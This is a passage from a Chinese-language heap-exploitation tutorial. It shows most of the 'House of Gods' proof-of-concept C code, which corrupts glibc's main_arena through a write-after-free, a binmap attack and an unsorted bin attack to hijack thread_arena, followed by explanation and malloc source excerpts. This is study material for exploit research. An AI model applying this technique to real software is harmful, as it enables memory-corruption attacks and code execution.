class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our smallchunk should be now in the 0x90-smallbin. This process also triggered\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the mark_bin(m, i) macro within the malloc source code. If you inspect the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main_arena&#x27;s binmap located at offset 0x855, you will notice that the initial\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value of the binmap changed from 0x0 to 0x200 - which can be used as a valid\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizefield to bypass the unsorted bin checks.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We would also need a valid bk pointer in order to bypass the partial unlinking\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;procedure within the unsorted bin. But luckily, the main_arena.next pointer at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x868 points initially to the start of the main_arena itself. This fact\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;makes it possible to pass the partial unlinking without segfaulting.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So now that we have crafted our binmap-chunk, it is time to allocate it\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;from the unsorted bin. For that, we will abuse a write-after-free bug\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;on an unsorted chunk. Let us start...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First, allocate another smallchunk...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * recycle our previously binned smallchunk.</span></span><br><span class="line"><span class="comment">     * Note that, it is not neccessary to recycle this</span></span><br><span class="line"><span class="comment">     * chunk. I am doing it only to keep the heap layout</span></span><br><span class="line"><span class="comment">     * small and compact.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...and now move our new chunk to the unsorted bin...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * put SMALLCHUNK into the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...in order to tamper with the free&#x27;d chunk&#x27;s bk pointer.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * bug: a single write-after-free bug on an</span></span><br><span class="line"><span class="comment">     * unsorted chunk is enough to initiate the</span></span><br><span class="line"><span class="comment">     * House of Gods technique.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (SMALLCHUNK + <span class="number">0x8</span>)) = leak + <span class="number">0x7f8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Great. We have redirected the unsorted bin to our binmap-chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;But we also have corrupted the bin. Let&#x27;s fix this, by redirecting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a second time.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The next chunk (head-&gt;bk-&gt;bk-&gt;bk) in the unsorted bin is located at the start\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of the main-arena. We will abuse this fact and free a 0x20-chunk and a 0x40-chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in order to forge a valid sizefield and bk pointer. We will also let the 0x40-chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;point to another allocated chunk (INTM) by writing to its bk pointer before\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;actually free&#x27;ing it.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * before free&#x27;ing those chunks, let us write</span></span><br><span class="line"><span class="comment">     * the address of another chunk to the currently</span></span><br><span class="line"><span class="comment">     * unused bk pointer of FAST40. We can reuse</span></span><br><span class="line"><span class="comment">     * the previously requested INTM chunk for that.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Free&#x27;ing FAST40 wont reset the bk pointer, thus</span></span><br><span class="line"><span class="comment">     * we can let it point to an allocated chunk while</span></span><br><span class="line"><span class="comment">     * having it stored in one of the fastbins.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The reason behind this, is the simple fact that</span></span><br><span class="line"><span class="comment">     * we will need to perform an unsorted bin attack later.</span></span><br><span class="line"><span class="comment">     * And we can not request a 0x40-chunk to trigger the</span></span><br><span class="line"><span class="comment">     * partial unlinking, since a 0x40 request will be serviced</span></span><br><span class="line"><span class="comment">     * from the fastbins instead of the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (FAST40 + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * and now free the 0x20-chunk in order to forge a sizefield.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(FAST20);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * and the 0x40-chunk in order to forge a bk pointer.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(FAST40);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay. The unsorted bin should now look like this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; SMALLCHUNK -&gt; binmap -&gt; main-arena -&gt; FAST40 -&gt; INTM\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk            bk        bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The binmap attack is nearly done. The only thing left to do, is\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;to make a request for a size that matches the binmap-chunk&#x27;s sizefield.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * all the hard work finally pays off...we can</span></span><br><span class="line"><span class="comment">     * now allocate the binmap-chunk from the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *BINMAP = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After allocating the binmap-chunk, the unsorted bin should look similar to this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; main-arena -&gt; FAST40 -&gt; INTM\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And that is a binmap attack. We&#x27;ve successfully gained control over a small\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number of fields within the main-arena. Two of them are crucial for\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the House of Gods technique\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; main_arena.next\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; main_arena.system_mem\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;By tampering with the main_arena.next field, we can manipulate the arena&#x27;s\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;linked list and insert the address of a fake arena. Once this is done,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;we can trigger two calls to malloc&#x27;s reused_arena() function.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The purpose of the reused_arena() function is to return a non-corrupted,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;non-locked arena from the arena linked list in case that the current\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arena could not handle previous allocation request.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The first call to reused_arena() will traverse the linked list and return\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a pointer to the current main-arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The second call to reused_arena() will traverse the linked list and return\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a pointer to the previously injected fake arena (main_arena.next).\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can reach the reused_arena() if we meet following conditions\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    - exceeding the total amount of arenas a process can have.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      malloc keeps track by using the narenas variable as\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      an arena counter. If this counter exceeds the limit (narenas_limit),\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      it will start to reuse existing arenas from the arena list instead\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      of creating new ones. Luckily, we can set narenas to a very large\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      value by performing an unsorted bin attack against it.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    - force the malloc algorithm to ditch the current arena.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      When malloc notices a failure it will start a second allocation\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      attempt with a different arena. We can mimic an allocation failure by\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      simply requesting too much memory i.e. 0xffffffffffffffc0 and greater.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let us start with the unsorted bin attack. We load the address of narenas\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;minus 0x10 into the bk pointer of the currently allocated INTM chunk...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set INTM&#x27;s bk to narenas-0x10. This will</span></span><br><span class="line"><span class="comment">     * be our target for the unsorted bin attack.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (INTM + <span class="number">0x8</span>)) = leak - <span class="number">0xa40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...and then manipulate the main_arena.system_mem field in order to pass the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size sanity checks for the chunk overlapping the main-arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this way we can abuse a heap pointer</span></span><br><span class="line"><span class="comment">     * as a valid sizefield.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (BINMAP + <span class="number">0x20</span>)) = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The unsorted bin should now look like this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; main-arena -&gt; FAST40 -&gt; INTM -&gt; narenas-0x10\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk      bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can now trigger the unsorted bin attack by requesting the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;INTM chunk as an exact fit.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * request the INTM chunk from the unsorted bin</span></span><br><span class="line"><span class="comment">     * in order to trigger a partial unlinking between</span></span><br><span class="line"><span class="comment">     * head and narenas-0x10.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Perfect. narenas is now set to the address of the unsorted bin&#x27;s head\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which should be large enough to exceed the existing arena limit.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s proceed with the manipulation of the main_arena.next pointer\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;within our previously allocated binmap-chunk. The address we write\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;to this field will become the future value of thread_arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set main_arena.next to an arbitrary address. The</span></span><br><span class="line"><span class="comment">     * next two calls to malloc will overwrite thread_arena</span></span><br><span class="line"><span class="comment">     * with the same address. I&#x27;ll reuse INTM as fake arena.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Note, that INTM is not suitable as fake arena but</span></span><br><span class="line"><span class="comment">     * nevertheless, it is an easy way to demonstrate that</span></span><br><span class="line"><span class="comment">     * we are able to set thread_arena to an arbitrary address.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (BINMAP + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done. Now all what&#x27;s left to do is to trigger two calls to the reused_arena()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function by making two requests for an invalid chunksize.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the first call will force the reused_arena()</span></span><br><span class="line"><span class="comment">     * function to set thread_arena to the address of</span></span><br><span class="line"><span class="comment">     * the current main-arena.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the second call will force the reused_arena()</span></span><br><span class="line"><span class="comment">     * function to set thread_arena to the address stored</span></span><br><span class="line"><span class="comment">     * in main_arena.next - our fake arena.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We did it. We hijacked the thread_arena symbol and from now on memory\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;requests will be serviced by our fake arena. Let&#x27;s check this out\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;by allocating a fakechunk on the stack from one of the fastbins\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of our new fake arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * construct a 0x70-fakechunk on the stack...</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">uint64_t</span> fakechunk[<span class="number">4</span>] = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="number">0x0000000000000000</span>, <span class="number">0x0000000000000073</span>,</span><br><span class="line">        <span class="number">0x4141414141414141</span>, <span class="number">0x0000000000000000</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ...and place it in the 0x70-fastbin of our fake arena</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (INTM + <span class="number">0x20</span>)) = (<span class="type">uint64_t</span>) (fakechunk);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fakechunk in position at stack address %p\n&quot;</span>, fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target data within the fakechunk at address %p\n&quot;</span>, &amp;fakechunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Its current value is %#lx\n\n&quot;</span>, fakechunk[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And after requesting a 0x70-chunk...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * use the fake arena to perform arbitrary allocations</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAKECHUNK = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...malloc returns us the fakechunk at %p\n\n&quot;</span>, FAKECHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Overwriting the newly allocated chunk changes the target\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data as well: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * overwriting the target data</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (FAKECHUNK)) = <span class="number">0x4242424242424242</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx\n&quot;</span>, fakechunk[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * confirm success</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">assert</span>(fakechunk[<span class="number">2</span>] == <span class="number">0x4242424242424242</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p>先了解一下 <code>binmap</code> 的用处。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>binmap</code> 在 <code>malloc</code> 过程中的下面两个场景会被修改：</p>
<ol>
<li>在遍历 <code>unsorted bin</code> 中的空闲 <code>chunk</code> 时如果将该 <code>chunk</code> 放入对应的 <code>small bin</code> 或 <code>large bin</code> 中会在 <code>binmap</code> 对应位置置位。</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mark_bin</span>(av, victim_index); </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>在遍历 <code>small bin + large bin</code> 找大小不小于当前 <code>chunk</code> 的空闲 <code>chunk</code> 时如果对应 <code>binmap</code> 置位的 <code>bin</code> 是空闲的就将对应位置复位。</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">av-&gt;binmap[block] = map &amp;= ~bit;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-18"><a href="#调试-18" class="headerlink" title="调试"></a>调试</h3><p>首先申请依次申请 <code>SMALLCHUNK_0x90, FASTCHUNK_0x20, FASTCHUNK_0x40</code>，然后将 <code>SMALLCHUNK_0x90</code> 释放到 <code>unsorted bin</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027200937204.png"
                      alt="image-20231027200937204"
                ></p>
<p>然后申请 <code>SMALLCHUNK_0xa0(INTM)</code>，这时候会触发第一个改变 <code>binmap</code> 的条件，会将 <code>binmap[0]</code> 改为 <code>0x200</code>，我们将其作为<code>fake_chunk_size</code>，暂且叫包含 <code>binmap</code> 的 <code>fake_chunk</code> 叫 <code>BINMAP</code>。并将 <code>SMALLCHUNK_0x90</code> 放进 <code>small_bin_0x90</code> 的位置上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201346420.png"
                      alt="image-20231027201346420"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201322231.png"
                      alt="image-20231027201322231"
                ></p>
<p>然后重新申请 <code>SMALLCHUNK_0x90</code>，再将其释放到 <code>unsorted_bin</code> 中。利用 <code>UAF</code> 漏洞将其 <code>SMALLCHUNK_0x90.bk-&gt;&amp;main_arena.bins[253]</code>，也就是 <code>fake_chunk_prevsize</code>。 再将 <code>FASTCHUNK_0x40.bk-&gt;(SMALLCHUNK_0xa0)INTM</code>，然后释放 <code>FASTBIN_0x20, FASTBIN_0x40</code>。其中 <code>FASTBIN_0x20</code> 正好位于 <code>main_arena_size</code>  的位置，其作用是确保 <code>main_arena</code> 所在的 <code>fake chunk</code> 的 <code>size</code> 大于 <code>2 * SIZE_SZ</code> 此时 <code>unsorted bin</code> 结构如下。</p>
<p><em>(因为 <code>binmap</code> 数组是 <code>uint</code> 类型是 <code>4</code> 字节大小，所以 <code>fake_chunk_binmap.bk == next</code> ，<code>next</code> 指针指向 <code>&amp;main_arena</code>)</em></p>
<p><code>head.bk -&gt; SMALLCHUNK_0x90.bk -&gt; BINMAP.bk -&gt; main-arena.bk -&gt; FASTCHUNK_0x40.bk -&gt; INTM</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027202331065.png"
                      alt="image-20231027202331065"
                ></p>
<p>此时申请 <code>0x1f8</code> 大小的 <code>chunk</code> 将会把正好合适的 <code>BINMAP</code> 申请出来。之后我们考虑通过如何把 <code>arena</code> 切换到 伪造的 <code>arena</code> 上。在 <code>__libc_malloc</code> 上，我们通过 <code>arena_get</code> 来获取 <code>arena</code> 。由于 <code>arena</code> 的 <code>flags</code> 的值一般为 <code>0</code> ，因此将宏展开后发现实际上是获取的 <code>thread_arena</code> 的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size)   \</span></span><br><span class="line"><span class="meta">    do &#123;                       \</span></span><br><span class="line"><span class="meta">        ptr = thread_arena;    \</span></span><br><span class="line"><span class="meta">        arena_lock(ptr, size); \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get</code> 获取 <code>arena</code> 后会调用 <code>_int_malloc</code> 尝试申请内存，如果 <code>_int_malloc</code> 返回 <code>NULL</code> 则调用 <code>arena_get_retry</code> 和 <code>_int_malloc</code> 尝试再次分配内存。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">arena_get</span>(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">   before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">LIBC_PROBE</span>(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = <span class="built_in">arena_get_retry</span>(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>arena</code> 为 <code>main_arena</code> ，因此实际上调用的是 <code>arena_get2</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> mstate</span></span><br><span class="line"><span class="function"><span class="title">arena_get_retry</span><span class="params">(mstate ar_ptr, <span class="type">size_t</span> bytes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LIBC_PROBE</span>(memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != &amp;main_arena) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (<span class="type">void</span>) <span class="built_in">mutex_unlock</span>(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">        ar_ptr = <span class="built_in">arena_get2</span>(bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get2</code> 函数中，如果 <code>n &lt;= narenas_limit - 1</code> 则调用 <code>_int_new_arena</code> 创建一个新的 <code>arena</code> 。否则调用 <code>reused_arena</code> 从现有的 <code>arena</code> 中找一个可用的 <code>arena</code>。</p>
